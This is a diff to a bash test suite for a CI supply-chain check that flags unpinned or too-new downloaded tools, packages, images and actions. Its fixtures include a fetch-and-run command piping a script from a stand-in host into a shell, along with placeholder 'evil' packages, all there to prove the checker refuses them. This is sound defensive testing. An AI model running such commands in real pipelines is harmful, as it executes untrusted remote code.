@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3
+# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC11
 # The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
 # package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
 # repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
@@ -357,7 +357,7 @@ PY
 
 
 # --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
-newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
+newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 "urllib3>=2.0"\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
 runck extras '{"times": {}}'
 CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
 check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
@@ -498,7 +498,7 @@ repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_o
 subprocess.run(["git", "init", "-q", repo], check=True)
 open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
 subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
-inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
+inv.load_at(repo, "HEAD"); inv.tree_files(repo, "HEAD")   # no UnicodeDecodeError
 PY
 
 CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
@@ -512,7 +512,7 @@ got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker 
 for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1", "action:local:./tools/act@(local)"):
     assert k in got, (k, sorted(got))
 assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
-assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
+assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"}), "a requirements file named by -r is READ (as an item source), not listed as an unmeasured form"
 assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
 PY
 CASE="a CHANGED download source or a new local action is refused (a placeholder is never a pin)"
@@ -543,7 +543,7 @@ repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
 subprocess.run(["git", "init", "-q", repo], check=True)
 open(repo + "/big.sh", "w").write("# x\n" * 300000)
 subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
-for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
+for fn in (lambda: inv.tree_files(repo, "HEAD"), lambda: inv.tree_files(repo, None)):
     try:
         fn()
     except RuntimeError as e:
@@ -570,8 +570,8 @@ for k in need:
 PY
 newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
 runck bigagent '{"times": {}}'
-CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
-check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"
+CASE="a 1.1 MB shell script anywhere (also under .github/agent/, advisor 0261: every script is in scope) is refused as too large to read: exit 2, never skipped and never turning the scan off"
+check test "$rc" -eq 2; check grep -qi 'too large' "$work/bigagent.out"
 
 CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
@@ -643,7 +643,8 @@ g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.
 it = [v for v in g.values() if v.name == "o/r"][0]
 assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
 assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
-assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
+assert [k for k in inv.inventory(wf("pip install --requirement deps.txt")) if "(unmeasured:" in k], "a requirements file that cannot be read is an unmeasured item"
+assert not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
 uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
 assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
 a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
@@ -688,7 +689,7 @@ k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.
 assert k1 != k2
 assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
 for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
-    assert inv.unmeasured(wf(ln)), ln
+    assert [k for k in inv.inventory(wf(ln)) if "(unmeasured:" in k], ln      # not readable here (not in the tree): refused as an unmeasured item
 assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
 assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
 it = [v for v in inv.inventory(wf('go install "$TOOL@v1.2.3"')).values() if v.kind == "gotool"][0]
@@ -917,6 +918,22 @@ check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
 live notfound
 CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
 check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"
+
+# --- the checker's false alarms (advisor 0238; cache issues #201-#208): cases in sc-fix-cases.py, rebuilt from the real records, every network seam faked ---------------------------
+scfix() {
+  local line out rc=0 ran=0
+  out=$(python3 "$here/sc-fix-cases.py" "$1" 2>&1) || rc=$?
+  while IFS= read -r line; do
+    case "$line" in
+      "ok   "*) pass=$((pass+1)); ran=$((ran+1)); echo "$line";;
+      "FAIL "*) failn=$((failn+1)); ran=$((ran+1)); echo "$line";;
+      "") ;;
+      *) echo "     $line";;
+    esac
+  done <<<"$out"
+  if [ "$ran" -eq 0 ] || { [ "$rc" -ne 0 ] && ! grep -q '^FAIL ' <<<"$out"; }; then CASE="sc-fix-cases.py $1 did not run to the end (or ran no case)"; bad "$CASE"; fi
+}
+scfix age
 
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
